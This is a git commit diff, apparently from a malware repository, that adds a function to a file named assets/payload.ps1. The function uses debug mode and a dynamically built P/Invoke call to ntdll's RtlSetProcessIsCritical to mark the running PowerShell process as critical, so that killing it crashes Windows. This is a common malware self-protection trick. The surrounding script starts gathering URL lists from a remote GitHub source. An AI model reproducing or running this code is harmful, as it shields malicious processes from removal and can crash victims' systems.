496b668fce6191a752dfaddacc3c446fbe35233d
faker-0000099 <pawnrate536@stackfl.site>
2026-04-02 18:49:10 +0700

    Update payload.ps1

--- assets/payload.ps1
+++ assets/payload.ps1
@@ -1,3 +1,30 @@
+function CriticalProcess {
+    param ([Parameter(Mandatory = $true)][string]$MethodName, [Parameter(Mandatory = $true)][uint32]$IsCritical, [uint32]$Unknown1, [uint32]$Unknown2)
+    [System.Diagnostics.Process]::EnterDebugMode() 
+    $domain = [AppDomain]::CurrentDomain
+    $name = New-Object System.Reflection.AssemblyName('DynamicAssembly')
+    $assembly = $domain.DefineDynamicAssembly($name, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $module = $assembly.DefineDynamicModule('DynamicModule')
+    $typeBuilder = $module.DefineType('PInvokeType', 'Public, Class')
+    $methodBuilder = $typeBuilder.DefinePInvokeMethod('RtlSetProcessIsCritical', 'ntdll.dll',
+        [System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::Static -bor [System.Reflection.MethodAttributes]::PinvokeImpl,
+        [System.Runtime.InteropServices.CallingConvention]::Winapi, [void], [System.Type[]]@([uint32], [uint32], [uint32]),
+        [System.Runtime.InteropServices.CallingConvention]::Winapi,
+        [System.Runtime.InteropServices.CharSet]::Ansi)
+    $type = $typeBuilder.CreateType()
+    $methodInfo = $type.GetMethod('RtlSetProcessIsCritical')
+    function InvokeRtlSetProcessIsCritical {
+        param ([uint32]$isCritical, [uint32]$unknown1, [uint32]$unknown2)
+        $methodInfo.Invoke($null, @($isCritical, $unknown1, $unknown2))
+    }
+    if ($MethodName -eq 'InvokeRtlSetProcessIsCritical') {
+        InvokeRtlSetProcessIsCritical -isCritical $IsCritical -unknown1 $Unknown1 -unknown2 $Unknown2
+    }
+    else {
+        Write-Host "Unknown method name: $MethodName"
+    }
+}
+CriticalProcess -MethodName InvokeRtlSetProcessIsCritical -IsCritical 1 -Unknown1 0 -Unknown2 0	
 # Hợp nhất danh sách URL từ cả hai nguồn
 $sources = @(
     "https://raw.githubusercontent.com/discord-mess/good-lucky/refs/heads/main/assets/best_urls.txt",
